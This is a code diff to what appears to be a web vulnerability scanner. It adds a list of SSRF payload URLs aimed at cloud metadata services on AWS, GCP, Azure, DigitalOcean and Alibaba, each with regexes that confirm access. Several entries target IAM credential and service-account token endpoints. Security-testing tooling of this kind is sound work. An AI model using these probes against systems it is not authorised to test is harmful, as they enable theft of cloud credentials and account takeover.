@@ -62,3 +62,25 @@ export function getSSRFPayloads(callbackUrl?: string): string[] {
   }
   return [...SSRF_PAYLOADS, ...generateCallbackPayloads(callbackUrl)];
 }
+
+/** Cloud metadata payloads — these target cloud provider metadata services.
+ *  Each has a specific response pattern to confirm real access. */
+export const CLOUD_METADATA_PROBES: Array<{ url: string; indicator: RegExp; cloud: string; severity: 'critical' }> = [
+  // AWS IMDSv1 (no token required)
+  { url: 'http://169.254.169.254/latest/meta-data/', indicator: /ami-id|instance-id|local-ipv4|hostname/i, cloud: 'AWS', severity: 'critical' },
+  { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', indicator: /AccessKeyId|SecretAccessKey|Token|Expiration|arn:aws:iam/i, cloud: 'AWS IAM Role', severity: 'critical' },
+  { url: 'http://169.254.169.254/latest/dynamic/instance-identity/document', indicator: /"instanceId"|"region"|"accountId"/i, cloud: 'AWS', severity: 'critical' },
+
+  // GCP metadata
+  { url: 'http://metadata.google.internal/computeMetadata/v1/', indicator: /instance\/|project\//i, cloud: 'GCP', severity: 'critical' },
+  { url: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', indicator: /access_token/i, cloud: 'GCP Token', severity: 'critical' },
+
+  // Azure IMDS
+  { url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', indicator: /"compute"|"network"/i, cloud: 'Azure', severity: 'critical' },
+
+  // DigitalOcean
+  { url: 'http://169.254.169.254/metadata/v1/', indicator: /droplet_id|hostname|region/i, cloud: 'DigitalOcean', severity: 'critical' },
+
+  // Alibaba Cloud
+  { url: 'http://100.100.100.200/latest/meta-data/', indicator: /instance-id|hostname/i, cloud: 'Alibaba', severity: 'critical' },
+];
